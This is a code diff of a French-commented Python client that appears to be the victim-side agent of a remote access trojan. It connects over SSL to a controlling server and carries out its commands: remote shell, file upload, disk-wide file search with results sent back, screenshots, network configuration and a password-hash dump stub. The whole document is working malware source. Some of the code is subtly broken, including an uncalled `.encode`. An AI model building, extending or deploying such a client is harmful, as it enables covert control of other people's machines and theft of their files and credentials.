@@ -21,28 +21,27 @@ def menu_help(ssl_socket):
     menu_help_to_send += "[*] exit        : quitter le programme et déconnexion de la machine victime."
     ssl_socket.send(menu_help_to_send.encode()) # Envoie du menu d'aides au serveur
 
-# Fonction permettant de charger un fichier du serveur
-def download(client_socket):
-    filename=input("Quel est le nom du fichier : ")
-    print('download')
-    try:
-        client_socket.send(f'download {filename}'.encode())
-
-        server_response = client_socket.recv(1024).decode()
-        if server_response == 'File not found':
-            print(f"Le fichier {filename} n'a pas été trouvé")
-            return
+# Fonction permettant d'envoyer un fichier au serveur
+def download(ssl_socket):
+    filename = ssl_socket.recv(4096).decode()
+    
+    disk_root = ("/")
+    results_filename = []
+    
+    for root, dirs, files in os.walk(disk_root): # Recherche du fichier à la racine
+        try:
+            if filename in files:
+                results_filename.append(os.path.join(root, filename))
+                print(results_filename)
         
-        with open(f'received_{filename}', 'wb') as file:
-            while True:
-                bytes_read = client_socket.recv(4096)
-                if not bytes_read:
-                    break
-                file.write(bytes_read)
-
-        print(f"Le fichier {filename} a été téléchargé avec succès.")
-    except Exception as e:
-        print(f"Erreur lors du téléchargement du fichier {filename} : {str(e)}")
+            if results_filename:
+                results_to_send = "\n".join(f"      -> ({i + 1}: {path}" for i, path in enumerate(results_filename))
+                ssl_socket.send(results_to_send.encode())
+            
+            else:
+                ssl_socket.send(b"no results")
+        except Exception as e:
+            ssl_socket.send(f"Erreur: {str(e)}".encode)
 
 # Fonction permettant de recevoir un fichier du serveur
 def upload(ssl_socket):
@@ -57,7 +56,6 @@ def upload(ssl_socket):
     except Exception as e:
         return(f"Erreur lors de la réception du fichier")
         
-
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
     repertoire_actuel = os.getcwd()  # Stockage du répertoire actuel
@@ -122,8 +120,6 @@ def hashdump(ssl_socket):
     print('hashdump')
 
 
-
-
 def main():
     # Récupération des variables
     load_dotenv()
@@ -137,30 +133,35 @@ def main():
     # Création du socket TCP pour la connexion au serveur
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)  # Enveloppement du socket avec SSL pour sécuriser la communication
-    ssl_socket.connect((ip_server, SERVER_PORT))  # Connexion au serveur en utilisant l'adresse IP et le port de connexion
+    try: #modif
+        ssl_socket.connect((ip_server, SERVER_PORT))  # Connexion au serveur en utilisant l'adresse IP et le port de connexion
 
     # Gestion des commandes reçues par le serveur
-    while True:
-        command = ssl_socket.recv(4096).decode()
-        if command.lower() == 'help':
-            menu_help(ssl_socket)
-        elif command.lower() == 'download':
-            download(ssl_socket)
-        elif command.lower() == 'upload':
-            upload(ssl_socket)
-        elif command.lower() == 'shell':
-            shell(ssl_socket)
-        elif command.lower() == 'ipconfig':
-            ipconfig(ssl_socket)
-        elif command.lower() == 'screenshot':
-            screenshot(ssl_socket)
-        elif command.lower().startswith('search'):
-            search(ssl_socket)
-        elif command.lower() == 'hashdump':
-            hashdump(ssl_socket)
-        elif command.lower() == 'exit':
-            break
-            ssl_socket.close()
+        while True:
+            command = ssl_socket.recv(4096).decode()
+            if command.lower() == 'help':
+                menu_help(ssl_socket)
+            elif command.lower().startswith('search'):
+                search(ssl_socket)
+            elif command.lower() == 'download':
+                search(ssl_socket)#modif
+                download(ssl_socket)
+            elif command.lower() == 'upload':
+                upload(ssl_socket)
+            elif command.lower() == 'shell':
+                shell(ssl_socket)
+            elif command.lower() == 'ipconfig':
+                ipconfig(ssl_socket)
+            elif command.lower() == 'screenshot':
+                screenshot(ssl_socket)
+            elif command.lower() == 'hashdump':
+                hashdump(ssl_socket)
+            elif command.lower() == 'exit':
+                break
+    except Exception as e: #modif
+        print(f"Erreur : {str(e)}")
+    finally:        
+        ssl_socket.close()
     #ssl_socket.close()  # Fermeture du socket
 
 if __name__ == "__main__":
